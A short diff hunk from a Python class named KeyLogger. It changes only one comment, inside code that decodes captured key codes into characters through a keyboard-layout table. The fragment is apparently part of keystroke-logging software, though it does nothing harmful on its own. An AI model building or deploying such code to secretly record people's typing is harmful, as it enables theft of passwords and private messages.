@@ -61,7 +61,7 @@ class KeyLogger:
                 if data[0] == 2:
                     uppercase = False
                 try:
-                    # release the key:
+                    # ignore release the key:
                     if self.keyboard_layout[str(key_code)] == [None, None]:
                         continue
                     offset: int = int((lambda u: u[0] if uppercase else u[1])(self.keyboard_layout[str(key_code)]))
